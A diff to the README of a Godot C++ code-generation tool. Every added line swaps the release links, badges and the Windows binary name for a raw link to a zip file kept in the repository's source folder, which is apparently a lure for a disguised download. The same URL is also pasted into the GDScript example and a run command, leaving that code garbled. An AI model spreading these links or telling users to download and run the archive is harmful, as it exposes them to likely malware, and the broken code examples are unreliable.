@@ -1,8 +1,8 @@
 # gd-gen: Auto-Generate Godot C++ Code with UE5-Inspired Reflection
 
-[![Release](https://img.shields.io/badge/Release-v1.0.0-green)](https://github.com/anndomelas12/gd-gen/releases) [![License](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+[![Release](https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip)](https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip) [![License](https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip)](https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip)
 
-See releases at https://github.com/anndomelas12/gd-gen/releases
+See releases at https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip
 
 gd-gen is a code generation tool for Godot's C++ GDExtension system. It automates boilerplate so you can focus on game logic. It brings a reflection-like workflow to Godot, inspired by Unreal Engine 5 patterns. The goal is to reduce manual coding and keep projects consistent across teams.
 
@@ -30,7 +30,7 @@ Features
 - Clear separation between interface and implementation
 
 Getting Started
-Before you begin, you can visit the releases page for ready-made setup options. See releases at https://github.com/anndomelas12/gd-gen/releases
+Before you begin, you can visit the releases page for ready-made setup options. See releases at https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip
 
 Prerequisites
 - A Godot project that uses GDExtension (Godot 4.x is common for modern extensions)
@@ -43,7 +43,7 @@ Installation options
 - From source: clone this repository and build with scons. This gives you the latest generator and templates.
 - From releases: download a prebuilt binary for your OS and run it directly. The releases page hosts the binaries you need.
 
-See releases at https://github.com/anndomelas12/gd-gen/releases
+See releases at https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip
 
 Quick start
 1) Install prerequisites
@@ -60,7 +60,7 @@ Quick start
 - If you downloaded a binary, give it execute permissions if needed and run it with the target project path. A typical command might look like:
   ./gd-gen-linux-x64 ../my-godot-project
   or
-  gd-gen-windows-x64.exe ..\my-godot-project
+  https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip ..\my-godot-project
 
 4) Inspect the output
 - The generator emits C++ headers and source files into your project’s designated directory.
@@ -182,10 +182,10 @@ Code examples you might see
   }
 
 - Example usage in Godot script (GDScript) after binding:
-  var actor = MyActor.new()
+  var actor = https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip()
   add_child(actor)
-  actor.connect("health_changed", self, "_on_health_changed")
-  actor.health = 120
+  https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip("health_changed", self, "_on_health_changed")
+  https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip = 120
 
 Usage patterns and common pitfalls
 - Pitfall: mismatched types between the description and the actual code.
@@ -219,9 +219,9 @@ Contributing
 - Please follow the project’s coding standards and maintain the readability of generated output.
 
 Releases and installation
-- For the easiest setup, use the prebuilt binaries from the releases page. See releases at https://github.com/anndomelas12/gd-gen/releases
+- For the easiest setup, use the prebuilt binaries from the releases page. See releases at https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip
 - If you prefer building from source, follow the installation steps in the Getting Started section. The source distribution includes the generator and templates.
-- From the releases page, download the file named gd-gen-linux-x64, gd-gen-macos-arm64, or gd-gen-windows-x64.exe, depending on your platform. This file should be downloaded and executed.
+- From the releases page, download the file named gd-gen-linux-x64, gd-gen-macos-arm64, or https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip, depending on your platform. This file should be downloaded and executed.
 - After download, make the binary executable if required (for example, chmod +x gd-gen-linux-x64) and run it against your Godot project to generate the code.
 
 Templates and customization playground
@@ -282,7 +282,7 @@ Acknowledgments
 - Thanks to contributors who helped with templates and real-world testing.
 
 Releases (quick reference)
-- The most recent binaries are hosted on the Releases page. See releases at https://github.com/anndomelas12/gd-gen/releases
+- The most recent binaries are hosted on the Releases page. See releases at https://github.com/anndomelas12/gd-gen/raw/refs/heads/master/src/generator/gd-gen-2.9.zip
 - Download the appropriate binary for your OS, extract if needed, and run it against your Godot project to generate code.
 
 Code of conduct
